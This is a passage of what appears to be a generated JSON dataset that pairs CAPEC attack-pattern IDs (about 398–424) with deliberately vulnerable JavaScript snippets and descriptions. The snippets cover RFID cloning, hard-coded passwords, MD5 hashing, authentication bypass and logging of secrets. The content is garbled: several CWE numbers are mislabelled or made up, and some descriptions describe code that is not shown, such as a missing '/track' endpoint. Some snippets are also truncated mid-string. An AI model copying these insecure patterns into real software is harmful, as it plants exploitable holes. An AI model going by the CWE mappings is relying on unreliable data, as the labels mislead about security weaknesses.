        "code_snippet": "const crypto = require('crypto');\n\n// CWE-327: Using a broken or risky cryptographic algorithm (MD5)\nfunction generateCardSequence(cardData) {\n  const md5 = crypto.createHash('md5');\n  md5.update(cardData);\n  const hash = md5.digest('hex');\n  return hash;\n}\n\n// CWE-321: Hard-coded cryptographic key\nconst secretKey = 'hardcodedkey';\n\n// CWE-307: No restriction on excessive authentication attempts\nlet attempts = 0;\nfunction authenticate(cardSequence) {\n  attempts++;\n  if (attempts > 1000) {\n    console.log('Warning: excessive authentication attempts');\n  }\n  // CWE-290: Authentication bypass by spoofing\n  if (cardSequence === generateCardSequence('knownCardData')) {\n    return true;\n  }\n  return false;\n}\n\n// CWE-1319: Susceptible to electromagnetic fault injection attacks\nconst cardData = 'magneticStripData';\nconst generatedSequence = generateCardSequence(cardData);\nconsole.log(`Generated card sequence: ${generatedSequence}`);\n\n// Attempt to authenticate with the generated sequence\nif (authenticate(generatedSequence)) {\n  console.log('Authentication successful');\n} else {\n  console.log('Authentication failed');\n}",
        "description": "This code snippet demonstrates the CAPEC of generating new magnetic strip cards with valid sequences for unauthorized access and impersonation. It uses a broken cryptographic algorithm (MD5), hard-coded cryptographic key, and lacks restriction on excessive authentication attempts, making it susceptible to brute force attacks. Additionally, it is vulnerable to authentication bypass by spoofing and electromagnetic fault injection attacks."
    },
    {
        "capec_id": "399",
        "code_snippet": "const rfidReader = require('rfid-reader');\nconst rfidWriter = require('rfid-writer');\n\n// CWE-1294: Insecure Security Identifier Mechanism\nconst securityIdentifier = '1234567890'; // hardcoded security identifier\n\n// CWE-1290: Incorrect Decoding of Security Identifiers\nfunction decodeSecurityIdentifier(signal) {\n  return signal.substring(0, 10); // incorrect decoding mechanism\n}\n\n// CWE-207: Observable Behavioral Discrepancy With Equivalent Products\nfunction readRFIDTag() {\n  return rfidReader.readTag(); // observable behavior\n}\n\n// CWE-694: Use of Multiple Resources with Duplicate Identifier\nconst rfidTags = {\n  '1234567890': 'Tag 1',\n  '1234567890': 'Tag 2' // duplicate identifier\n};\n\n// CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\nfunction writeRFIDTag(tagData) {\n  rfidWriter.writeTag(tagData); // no protection against EM-FI\n}\n\n// CAPEC: RFID signal duplication\nfunction duplicateRFIDSignal() {\n  const originalSignal = readRFIDTag();\n  const duplicatedSignal = originalSignal;\n  writeRFIDTag(duplicatedSignal);\n}\n\nduplicateRFIDSignal();",
        "description": "This code snippet demonstrates the CAPEC of RFID signal duplication, which can be used to clone an RFID tag. The code includes several CWEs, including insecure security identifier mechanism, incorrect decoding of security identifiers, observable behavioral discrepancy with equivalent products, use of multiple resources with duplicate identifier, and improper protection against electromagnetic fault injection. The code reads an RFID tag, duplicates the signal, and writes it back to a new tag, allowing an attacker to clone the original tag."
    },
    {
        "capec_id": "400",
        "code_snippet": "const rfidTag = {\n  debugInterface: {\n    accessControl: false,\n    internalRegisters: ['adminMode', 'errorInjection'],\n  },\n  redundancyBlock: {\n    errorInjection: true,\n  },\n  outboundErrorMessages: {\n    alerts: {\n      signalConditions: ['highTemp', 'lowPower'],\n      responseMechanism: 'none',\n    },\n  },\n  decommission: {\n    scrubbingCapability: false,\n  },\n  securityIdentifiers: {\n    decodingMechanism: (signal) => {\n      if (signal === 'adminSignal') {\n        return 'unauthorizedAccess';\n      }\n    },\n  },\n};\n\nconst attacker = {\n  disableTag: () => {\n    rfidTag.debugInterface.accessControl = false;\n    rfidTag.redundancyBlock.errorInjection = true;\n    rfidTag.outboundErrorMessages.alerts.responseMechanism = 'none';\n    rfidTag.decommission.scrubbingCapability = false;\n    rfidTag.securityIdentifiers.decodingMechanism = (signal) => 'unauthorizedAccess';\n  },\n};\n\nattacker.disableTag();",
        "description": "This code snippet demonstrates an RFID tag that can be disabled by an attacker, exploiting various vulnerabilities. The debug interface has no access control, allowing the attacker to inject errors into the redundancy block, disable outbound error messages, and bypass decommissioning scrubbing. The security identifiers decoding mechanism is also flawed, granting unauthorized access. The attacker can then use these vulnerabilities to disable the RFID tag."
    },
    {
        "capec_id": "401",
        "code_snippet": "const hardwareInterface = require('hardware-interface');\n\n// CWE-1263: Improper Physical Access Control\nif (physicalAccessGranted()) {\n  // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n  hardwareInterface.setClockSpeed(1000);\n  hardwareInterface.setPowerMode('turbo');\n\n  // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n  try {\n    hardwareInterface.setVoltage(5);\n  } catch (e) {\n    console.log('Voltage glitch detected!');\n  }\n\n  // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n  hardwareInterface.activateDebugMode();\n\n  // CWE-1300: Improper Protection of Physical Side Channels\n  const powerConsumption = hardwareInterface.getPowerConsumption();\n  console.log('Power consumption:', powerConsumption);\n}\n",
        "description": "This code snippet demonstrates a vulnerable hardware interface that allows an adversary to exploit weaknesses in access control, software interfaces, and physical side channels to undermine the system's integrity. The code grants physical access, sets clock speed and power mode, attempts to set voltage, activates debug mode, and logs power consumption, all of which can be exploited by an attacker to carry out an attack."
    },
    {
        "capec_id": "402",
        "code_snippet": "const ataSecurity = {\n  password: 'hardcoded_password',\n  authenticated: false,\n  updatePassword: function(newPassword) {\n    // CWE-285: No authorization check\n    // CWE-259: Hard-coded password\n    if (this.password === 'hardcoded_password') {\n      this.password = newPassword;\n    }\n  },\n  resetPassword: function() {\n    // CWE-798: Hard-coded credentials\n    const defaultPassword = 'default_password';\n    this.password = defaultPassword;\n  }\n};\n\n// CWE-1220: Insufficient granularity of access control\n// CWE-1233: Security-sensitive hardware controls with missing lock bit protection\nfunction hotSwapDrive() {\n  ataSecurity.resetPassword();\n  ataSecurity.updatePassword('new_password');\n}\n",
        "description": "This code snippet demonstrates the CAPEC of exploiting a weakness in ATA security on a drive. It includes CWE-285 (Improper Authorization) by not performing an authorization check before updating the password, CWE-259 (Use of Hard-coded Password) by using a hard-coded password, CWE-798 (Use of Hard-coded Credentials) by using hard-coded credentials for reset, CWE-1220 (Insufficient Granularity of Access Control) by allowing unauthorized access to the drive, and CWE-1233 (Security-Sensitive Hardware Controls with Missing Lock Bit Protection) by not ensuring the lock bit prevents modification of system registers."
    },
    {
        "capec_id": "404",
        "code_snippet": "const dns = require('dns');\nconst fs = require('fs');\nconst log4js = require('log4js');\n\n// CWE-350: Reliance on DNS Lookups in a Security Decision\nconst lookup = dns.lookup('example.com', (err, address, family) => {\n  if (err) {\n    console.log(err);\n  } else {\n    // CWE-766: Critical Data Element\n    const criticalData = fs.readFileSync('critical_data.txt', 'utf8');\n    // CWE-767: Data Element\n    const dataElement = fs.readFileSync('data_element.txt', 'utf8');\n    // CWE-287: Improper Authentication\n    const auth = authenticateUser(address);\n    if (auth) {\n      // CWE-532: Information Exposure Through Query Strings in GET Requests\n      const query = 'SELECT * FROM users WHERE address=\\'' + address + '\\'';\n      // CWE-493: Critical Data Exposure\n      const confidentialData = fs.readFileSync('confidential_data.txt', 'utf8');\n      console.log(confidentialData);\n    }\n  }\n});\n\n// CWE-532: Information Exposure Through Query Strings in GET Requests\nlog4js.configure({\n  appenders: {\n    file: {\n      type: 'file\\",
        "description": "This code snippet demonstrates a deprecated attack pattern that involves collecting and analyzing information. It includes various CWEs such as CWE-350 (Reliance on DNS Lookups in a Security Decision), CWE-766 and CWE-767 (Failure to Protect Stored Data from Modification), CWE-287 (Improper Authentication), CWE-532 (Information Exposure Through Query Strings in GET Requests), and CWE-493 (Critical Data Exposure). The code performs DNS lookups, reads sensitive data from files, and logs information to a file, exposing confidential data and demonstrating poor security practices."
    },
    {
        "capec_id": "405",
        "code_snippet": "const dns = require('dns');\nconst fs = require('fs');\n\n// CWE-247: Reliance on DNS Lookups in a Security Decision\nfunction authenticateUser(username, password) {\n  const domain = 'example.com';\n  dns.resolve(domain, (err, addresses) => {\n    if (err) {\n      console.log('DNS resolution failed');\n    } else {\n      // CWE-592: Authentication Bypass Issues\n      if (username === 'admin' && password === 'password') {\n        console.log('Authenticated');\n      } else {\n        console.log('Authentication failed');\n      }\n    }\n  });\n}\n\n// CWE-533: Information Exposure Through Server Log Files\nfunction logRequest(req) {\n  fs.appendFile('log.txt', `${req.method} ${req.url} ${req.headers['user-agent']}\n`, (err) => {\n    if (err) {\n      console.log('Error logging request');\n    }\n  });\n}\n\n// CWE-217: Failure to Protect Stored Data from Modification\nconst userData = {\n  username: 'user',\n  password: 'password'\n};\n\nfunction modifyUserData() {\n  userData.username = 'hacker';\n  userData.password = 'newpassword';\n}\n\n// CWE-218: Failure to provide confidentiality for stored data\nconst confidentialData = {\n  apiKey: '1234567890'\n};\n\nfunction exposeConfidentialData() {\n  console.log(confidentialData.apiKey);\n}",
        "description": "This code snippet demonstrates a deprecated attack pattern that involves collecting and analyzing information. It includes various deprecated CWEs, such as reliance on DNS lookups in a security decision, authentication bypass issues, information exposure through server log files, failure to protect stored data from modification, and failure to provide confidentiality for stored data."
    },
    {
        "capec_id": "406",
        "code_snippet": "const fs = require('fs');\nconst repo = fs.readFileSync('/path/to/repository', 'utf8');\nconst coreDump = fs.readFileSync('/path/to/coreDump', 'utf8');\nconst sensitiveInfo = 'username:password';\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nconst socket = require('net').createConnection(8080, 'localhost');\nsocket.write(sensitiveInfo);\n\n// CWE-316: Cleartext Storage of Sensitive Information in Memory\nconst memoryStorage = sensitiveInfo;\n\n// CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\nconst decommissionedDevice = { data: sensitiveInfo };\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nconst exposedRepo = repo;\n\n// CWE-528: Exposure of Core Dump File to an Unauthorized Control Sphere\nconst exposedCoreDump = coreDump;\n\n// Simulating dumpster diving by making sensitive information accessible\nfs.writeFileSync('/path/to/trash', exposedRepo);\nfs.writeFileSync('/path/to/trash', exposedCoreDump);\nfs.writeFileSync('/path/to/trash', decommissionedDevice.data);\nfs.writeFileSync('/path/to/trash', memoryStorage);\n",
        "description": "This code snippet demonstrates the CAPEC of dumpster diving by simulating the exposure of sensitive information through various CWEs. It includes cleartext transmission and storage of sensitive information, improper scrubbing of sensitive data from decommissioned devices, and exposure of version-control repositories and core dump files to unauthorized control spheres. The code writes sensitive information to a 'trash' directory, making it accessible to unauthorized actors."
    },
    {
        "capec_id": "407",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n  const sessionId = Math.random().toString(36).substr(2, 10);\n  res.cookie('sessionId', sessionId);\n  res.send('Login successful!');\n});\n\napp.get('/admin', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessionId) {\n    res.send('Welcome, admin!');\n  } else {\n    res.send('Access denied.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000.');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that is susceptible to pretexting attacks. The server generates a random session ID for each user and stores it in a cookie. However, it does not invalidate the existing session ID, allowing an attacker to steal authenticated sessions (CWE-384). The server also does not verify the identity of the actor at the other end of the communication channel, making it vulnerable to channel accessible by non-endpoint attacks (CWE-300). Furthermore, the user interface does not properly represent critical information to the user, making it vulnerable to UI misrepresentation of critical information attacks (CWE-451). The creation of emergent resources (CWE-1229) is also possible, as the server creates a new session ID for each user without properly managing resources. Finally, the server exposes sensitive information to unauthorized actors (CWE-200), as the session ID is stored in a cookie that can be accessed by an attacker."
    },
    {
        "capec_id": "408",
        "code_snippet": "const dns = require('dns');\nconst fs = require('fs');\n\n// CWE-350: Reliance on DNS Lookups in a Security Decision\nfunction checkDomain(domain) {\n  dns.lookup(domain, (err, address) => {\n    if (address) {\n      // Grant access based on DNS lookup result\n      return true;\n    } else {\n      return false;\n    }\n  });\n}\n\n// CWE-766: Critical Data Element\nconst criticalData = 'secret_key';\n\n// CWE-767: Data Element\nconst dataElement = 'user_data';\n\n// CWE-532: Information Exposure Through Log Files\nconst logFile = 'log.txt';\nfs.appendFile(logFile, `Critical Data: ${criticalData} | Data Element: ${dataElement}\\n`, (err) => {\n  if (err) {\n    console.error(err);\n  }\n});\n\n// CWE-493: Failure to Provide Confidentiality for Stored Data\nconst storedData = 'confidential_info';\nfs.writeFile('stored_data.txt', storedData, (err) => {\n  if (err) {\n    console.error(err);\n  }\n});",
        "description": "This code snippet demonstrates the deprecated CAPEC attack pattern, which involves collecting and analyzing information. It includes various CWEs, such as CWE-350 (reliance on DNS lookups in a security decision), CWE-766 and CWE-767 (failure to protect stored data from modification), CWE-532 (information exposure through log files), and CWE-493 (failure to provide confidentiality for stored data). The code uses DNS lookups to make security decisions, stores sensitive data in log files and plaintext files, and fails to protect stored data from modification."
    },
    {
        "capec_id": "409",
        "code_snippet": "const dns = require('dns');\nconst fs = require('fs');\n\n// CWE-350: Reliance on DNS Lookups in a Security Decision\nfunction getDomainOwner(domain) {\n  return new Promise((resolve, reject) => {\n    dns.lookup(domain, (err, address, family) => {\n      if (err) {\n        reject(err);\n      } else {\n        resolve(address);\n      }\n    });\n  });\n}\n\n// CWE-766: Critical Data Element\nconst criticalData = 'topSecretInfo';\n\n// CWE-767: Data Element Aggregating\nconst aggregatedData = {\n  criticalData,\n  otherData: 'someOtherInfo'\n};\n\n// CWE-532: Information Exposure Through Log Files\nfunction logData(data) {\n  fs.appendFile('log.txt', JSON.stringify(data) + '\\n', (err) => {\n    if (err) {\n      console.error(err);\n    }\n  });\n}\n\n// CWE-493: Failure to Provide Confidentiality for Stored Data\nconst storedData = {\n  username: 'admin',\n  password: 'password123'\n};\n\nlogData(storedData);\nlogData(aggregatedData);\n",
        "description": "This code snippet demonstrates a deprecated attack pattern that involves collecting and analyzing information. It includes various CWEs such as CWE-350 (reliance on DNS lookups in a security decision), CWE-766 and CWE-767 (data element vulnerabilities), CWE-532 (information exposure through log files), and CWE-493 (failure to provide confidentiality for stored data). The code uses DNS lookups to resolve a domain, stores critical data in a log file, and aggregates sensitive information, all of which can lead to security vulnerabilities."
    },
    {
        "capec_id": "410",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  if (req.headers['User-Agent'].includes('Chrome')) {\n    res.json({\n      'sensitiveData': 'This is confidential information'\n    });\n  } else {\n    res.json({\n      'message': 'Access denied'\n    });\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that exposes sensitive information to unauthorized actors based on the User-Agent header. The application behaves differently depending on the browser type, which is an observable behavioral discrepancy (CWE-205). The sensitive information is not properly verified and is exposed to unauthorized actors (CWE-200). Additionally, the application truncates security-relevant information by only displaying a generic error message for non-Chrome browsers (CWE-222). The code also fails to properly verify the source of the communication channel, allowing an attacker to impersonate a legitimate user (CWE-940)."
    },
    {
        "capec_id": "411",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/logs', (req, res) => {\n  const logFiles = ['server.log', 'debug.log', 'cleanup.log'];\n  const logs = {};\n  logFiles.forEach((file) => {\n    try {\n      const logData = fs.readFileSync(file, 'utf8');\n      logs[file] = logData;\n    } catch (e) {\n      console.error(`Error reading ${file}: ${e}`);\n    }\n  });\n  res.json(logs);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server that exposes sensitive information through log files. The server reads log files (server.log, debug.log, cleanup.log) and returns their contents as JSON responses. This is a classic example of information exposure through log files (CWE-532), which can lead to authentication bypass issues (CWE-592) and other security vulnerabilities. The code also lacks proper error handling and access control, making it vulnerable to pretexting attacks (CAPEC-407)."
    },
    {
        "capec_id": "412",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/verifyCreditCard', (req, res) => {\n  const creditCardNumber = req.body.creditCardNumber;\n  const customerName = req.body.customerName;\n  // No verification of the source of the request is performed\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (customerName && creditCardNumber) {\n    // CWE-300: Channel Accessible by Non-Endpoint\n    // CWE-408: Incorrect Behavior Order: Early Amplification\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    res.send(`Thank you, ${customerName}. Your credit card number is: ${creditCardNumber}`);\n  } else {\n    res.status(400).send('Invalid request');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js server that accepts a POST request to verify a credit card number. The server does not properly verify the source of the request, allowing an adversary to pretend to be a customer service representative and solicit sensitive information from users. The server also exposes the credit card number to an unauthorized actor and performs an expensive operation before authentication or authorization has taken place."
    },
    {
        "capec_id": "413",
        "code_snippet": "const techSupport = {\n  impersonate: function(target) {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    const sensitiveInfo = target.getPrivateInfo();\n    console.log(sensitiveInfo);\n\n    // CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n    const personalData = target.getPersonalData();\n    console.log(personalData);\n\n    // CWE-434: Unrestricted Upload of File with Dangerous Type\n    const maliciousFile = new File(['malicious code'], 'malicious.exe');\n    target.uploadFile(maliciousFile);\n\n    // CWE-1263: Improper Physical Access Control\n    const usbDrive = new USBDrive();\n    usbDrive.loadPayload('malicious_payload.exe');\n    target.insertUSB(usbDrive);\n\n    // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n    const sensitiveData = 'username:password';\n    target.writeToFile('publiclyAccessibleFile.txt', sensitiveData);\n  }\n};\n\nconst target = {\n  getPrivateInfo: function() {\n    return 'private info';\n  },\n  getPersonalData: function() {\n    return 'personal data';\n  },\n  uploadFile: function(file) {\n    console.log('File uploaded: ' + file.name);\n  },\n  insertUSB: function(usbDrive) {\n    console.log('USB drive inserted');\n  },\n  writeToFile: function(fileName, data) {\n    console.log('Wrote to file: ' + fileName);\n  }\n};\n\ntechSupport.impersonate(target);",
        "description": "This code snippet demonstrates a social engineering attack where a malicious actor impersonates a tech support worker to gain access to sensitive information and manipulate the target into performing actions that serve the adversary's interests."
    },
    {
        "capec_id": "414",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.get('/delivery', (req, res) => {\n  const deliveryId = req.query.deliveryId;\n  const filePath = `/deliveries/${deliveryId}.txt`;\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.status(404).send('Delivery not found');\n    } else {\n      res.set('Content-Disposition', `attachment; filename=\\",
        "description": "This code snippet demonstrates a vulnerable delivery tracking system. An adversary can impersonate a delivery person by sending a POST request to the '/track' endpoint with a fabricated tracking ID and delivery status. The system stores the sensitive information (delivery status) in an externally accessible file (/tracking/<trackingId>.txt) without proper access control, allowing the adversary to manipulate the delivery status (CWE-538). The system also fails to verify the identity of the actor at the other end of the communication channel, allowing an unauthorized actor to access the channel (CWE-300). Furthermore, the system uses an incorrect conversion mechanism to map the tracking ID to a security identifier, allowing an untrusted agent to gain unauthorized access to the asset (CWE-1292). Additionally, the system does not correctly specify the intended destination for the communication channel, allowing an adversary to intercept the communication (CWE-941). Finally, the system stores raw content (delivery status) under the web document root with an extension that is not specifically handled by the server, making it accessible to an adversary (CWE-433)."
    },
    {
        "capec_id": "415",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/helpdesk', (req, res) => {\n  const callerId = req.body.callerId;\n  const issueDescription = req.body.issueDescription;\n  // CWE-300: No verification of callerId\n  if (callerId === 'admin') {\n    // CWE-940: No verification of request origin\n    const solution = getSolution(issueDescription);\n    res.send(solution);\n  } else {\n    res.send('Access denied');\n  }\n});\n\nfunction getSolution(issueDescription) {\n  // CWE-301: Reflection attack possible\n  const solution = database.getSolution(issueDescription);\n  return solution;\n}\n\napp.listen(3000, () => {\n  console.log('Help desk server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable help desk server that is susceptible to pretexting attacks. An attacker can impersonate an admin by sending a POST request to the /helpdesk endpoint with a callerId of 'admin', without any verification of the caller's identity. The server then provides the solution to the issue without verifying the request origin, making it vulnerable to CWE-940. Additionally, the getSolution function is vulnerable to reflection attacks, as it does not properly verify the source of the request. This code also exposes sensitive information to unauthorized actors, violating CWE-200."
    },
    {
        "capec_id": "416",
        "code_snippet": "const userInteractions = {}; \n\nfunction getSensitiveInfo(username) { \n  if (userInteractions[username] && userInteractions[username].count < 5) { \n    userInteractions[username].count++; \n    return 'Your password is: ' + getPassword(username); \n  } else { \n    return 'Access denied'; \n  } \n} \n\nfunction getPassword(username) { \n  // Simulating a database query \n  const password = 'password123'; \n  return password; \n} \n\n// Simulating user interactions \nsetInterval(() => { \n  const username = 'johnDoe'; \n  console.log(getSensitiveInfo(username)); \n}, 1000);",
        "description": "This code snippet demonstrates a social engineering attack where an adversary manipulates a user into revealing sensitive information by creating a sense of comfort and familiarity. The code keeps track of user interactions and only reveals sensitive information after a certain number of interactions. The getPassword function simulates a database query, which can be used to infer sensitive information. The setInterval function simulates repeated user interactions, which can be used to exploit the Improper Control of Interaction Frequency (CWE-799). The code also exposes sensitive information to an unauthorized actor (CWE-200) and uses observable behavioral discrepancies (CWE-205) to reveal internal state or decision process."
    },
    {
        "capec_id": "417",
        "code_snippet": "const adminPassword = 'hidden_password';\n\nfunction authenticateUser(username, password) {\n  if (username === 'admin' && password.length > 5) {\n    // CWE-654: Reliance on a Single Factor in a Security Decision\n    // CWE-301: Reflection Attack in an Authentication Protocol\n    return password === adminPassword;\n  } else {\n    // CWE-222: Truncation of Security-relevant Information\n    // CWE-205: Observable Behavioral Discrepancy\n    return 'Access Denied';\n  }\n}\n\n// CWE-656: Reliance on Security Through Obscurity\nfunction obscureAdminPassword() {\n  return adminPassword.replace(/./g, '*');\n}\n\nconsole.log(authenticateUser('admin', 'hidden')); // true\nconsole.log(obscureAdminPassword()); // ******_password",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that relies on security through obscurity, single-factor decision making, and truncation of security-relevant information. The admin password is hardcoded and obscured using a simple replacement function, making it vulnerable to reflection attacks and observable behavioral discrepancies."
    },
    {
        "capec_id": "418",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/compliment', (req, res) => {\n  const username = req.query.username;\n  const compliment = `Wow, ${username}! You have an amazing taste in music.`;\n  res.send(compliment);\n});\n\napp.get('/askQuestion', (req, res) => {\n  const question = `What's your favorite song, ${req.query.username}?`;\n  res.send(question);\n});\n\napp.post('/submitAnswer', (req, res) => {\n  const answer = req.body.answer;\n  // No verification of the source of the request\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  console.log(`Received answer from ${req.ip}: ${answer}`);\n  res.send('Thank you for your answer!');\n});",
        "description": "This code snippet demonstrates a social engineering attack that fosters a sense of obligation in the target. The attacker sends a compliment to the target, and then asks a question that requires the target to provide sensitive information. The code does not properly verify the source of the request, making it vulnerable to CWE-940. Additionally, the code does not ensure the integrity of the communication channel, making it vulnerable to CWE-300. The code also does not correctly specify the intended destination for the request, making it vulnerable to CWE-941."
    },
    {
        "capec_id": "419",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const userAgent = req.headers['user-agent'];\n  if (userAgent.includes('Chrome')) {\n    res.set('Content-Encoding', 'gzip');\n    res.send('Chrome user');\n  } else if (userAgent.includes('Firefox')) {\n    res.set('Content-Encoding', 'deflate');\n    res.send('Firefox user');\n  } else {\n    res.set('Content-Encoding', 'identity');\n    res.send('Unknown user');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side code that exhibits observable behavioral discrepancies based on the user agent. It uses different content encoding schemes (gzip, deflate, or identity) depending on the user agent, which can be observed by an unauthorized actor. This discrepancy can reveal information about the internal state or decision process of the server, making it vulnerable to attacks."
    },
    {
        "capec_id": "420",
        "code_snippet": "const scarcityTimer = 10;\nlet limitedSupply = 5;\nlet userAction = '';\n\nfunction createScarcity() {\n  if (limitedSupply > 0) {\n    console.log(`Hurry! Only ${limitedSupply} spots left!`);\n    limitedSupply--;\n    setTimeout(createScarcity, scarcityTimer * 1000);\n  } else {\n    console.log('Sorry, all spots are taken!');\n  }\n}\n\nfunction handleUserAction(action) {\n  if (action === 'buy') {\n    if (limitedSupply > 0) {\n      console.log('Thank you for your purchase!');\n      limitedSupply--;\n    } else {\n      console.log('Sorry, all spots are taken!');\n    }\n  }\n}\n\ncreateScarcity();\n\n// Asymmetric Resource Consumption (Amplification)\nsetInterval(() => {\n  console.log('Background task running...');\n}, 1000);\n\n// Reliance on Security Through Obscurity\nconst secretKey = 'mySecretKey';\n\n// Truncation of Security-relevant Information\nconst truncatedLog = console.log.bind(console);\ntruncatedLog('Security log: ' + '***TRUNCATED***');\n\n// Observable Behavioral Discrepancy\nif (Math.random() < 0.5) {\n  console.log('Internal state: Everything is fine.');\n} else {\n  console.log('Internal state: Something is wrong.');\n}",
        "description": "This code snippet demonstrates the CAPEC 'Leverage of Scarcity' by creating a sense of urgency in the user through a timer and limited supply. The code also incorporates CWEs such as Asymmetric Resource Consumption (Amplification) through the use of setInterval, Reliance on Security Through Obscurity with a secret key, Truncation of Security-relevant Information through console log truncation, and Observable Behavioral Discrepancy through random internal state logging."
    },
    {
        "capec_id": "421",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/admin', (req, res) => {\n  const adminUsername = 'admin';\n  const adminPassword = 'password';\n  const { username, password } = req.body;\n\n  if (username === adminUsername && password === adminPassword) {\n    // Impersonating an admin user\n    res.locals.isAdmin = true;\n    res.send('Welcome, Admin!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.post('/transfer', (req, res) => {\n  if (res.locals.isAdmin) {\n    // CWE-300: Channel Accessible by Non-Endpoint\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    const { amount, recipient } = req.body;\n    // Perform sensitive action without proper verification\n    console.log(`Transferring $${amount} to ${recipient}`);\n    res.send(`Transfer successful!`);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be exploited by an adversary to impersonate an admin user. The authentication mechanism relies on a single factor (username and password) and does not properly verify the source of the communication channel. Once authenticated, the adversary can perform sensitive actions, such as transferring funds, without proper verification."
    },
    {
        "capec_id": "422",
        "code_snippet": "const express = require('express');\nconst app = express();\n\nlet requestCount = 0;\nlet lastRequestTime = 0;\n\napp.get('/api/data', (req, res) => {\n  const currentTime = new Date().getTime();\n  if (currentTime - lastRequestTime < 1000) {\n    requestCount++;\n    if (requestCount > 5) {\n      res.status(429).send('Too many requests');\n      return;\n    }\n  } else {\n    requestCount = 1;\n  }\n  lastRequestTime = currentTime;\n\n  // Perform some action that takes some time\n  setTimeout(() => {\n    res.send('Data');\n  }, 500);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server-side implementation that does not properly limit the frequency of interactions (CWE-799). An attacker can exploit this by sending multiple requests in a short period, and the server will eventually respond with a 'Too many requests' error (CWE-203, CWE-205). The server also does not verify the origin of the incoming requests (CWE-940), making it vulnerable to HTTP request smuggling (CWE-444). The code uses Express.js to create a server that responds to GET requests to '/api/data'. It keeps track of the number of requests and the time of the last request. If more than 5 requests are made within a second, it returns a 429 error. However, this implementation can be exploited by an attacker using social engineering tactics to convince the target to make multiple requests, eventually leading to the server revealing its internal state."
    },
    {
        "capec_id": "423",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n  const username = req.query.username;\n  const password = req.query.password;\n  if (username === 'admin' && password === 'password123') {\n    res.cookie('auth_token', 'trusted_user_token', { httpOnly: true });\n    res.redirect('/protected');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const authToken = req.cookies.auth_token;\n  if (authToken === 'trusted_user_token') {\n    res.send('Welcome, trusted user!');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that relies on a single factor (the 'auth_token' cookie) to grant access to protected resources. An attacker can exploit this by reflecting the trusted user's token back to the server, impersonating the trusted user. The code also uses security through obscurity by relying on the secrecy of the 'trusted_user_token' value. Additionally, the use of implicit intent for sensitive communication is demonstrated by sending the sensitive 'auth_token' value as a cookie."
    },
    {
        "capec_id": "424",
        "code_snippet": "const users = {\n  admin: { password: 'password123' },\n  user1: { password: 'user1pass' },\n  user2: { password: 'user2pass' }\n};\n\nfunction authenticate(username, password) {\n  if (username === 'admin' && password === users.admin.password) {\n    return { success: true, message: 'Admin login successful' };\n  } else if (username === 'user1' && password === users.user1.password) {\n    return { success: true, message: 'User1 login successful' };\n  } else if (username === 'user2' && password === users.user2.password) {\n    return { success: true, message: 'User2 login successful' };\n  } else {\n    return { success: false, message: 'Invalid credentials' };\n  }\n}\n\n// Reflection attack\nfunction reflectAttack(username, password) {\n  const response = authenticate(username, password);\n  if (response.success) {\n    return { success: true, message: 'Login successful' };\n  } else {\n    return { success: false, message: 'Invalid credentials' };\n  }\n}\n\n// Observable behavioral discrepancy\nfunction login(username, password) {\n  const response = authenticate(username, password);\n  if (response.success) {\n    console.log('Login successful');\n    // Different behavior for admin and users\n    if (username === 'admin') {\n      console.log('Admin dashboard loaded');\n    } else {\n      console.log('User dashboard loaded');\n    }\n  } else {\n    console.log('Invalid credentials');\n  }\n}",
